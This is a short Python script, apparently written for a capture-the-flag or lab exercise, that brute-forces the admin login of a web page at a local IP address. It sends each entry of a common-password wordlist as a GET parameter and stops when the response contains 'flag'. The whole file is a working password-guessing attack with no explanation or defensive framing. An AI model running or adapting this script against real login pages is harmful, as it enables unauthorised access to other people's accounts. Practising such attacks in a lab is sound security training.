import requests as req

params = {
    'page': 'signin',
    'username': 'admin',
    'password': '',
    'Login': 'Login',
}

with open("10k-most-common.txt") as f:
	for x in f:
		params["password"] = x.strip()
		print(params["password"])
		response = req.get('http://192.168.1.33/#', params=params, stream=True)
		if response.text.find("flag") != -1:
			print(x)
			print(response.text)
			exit()
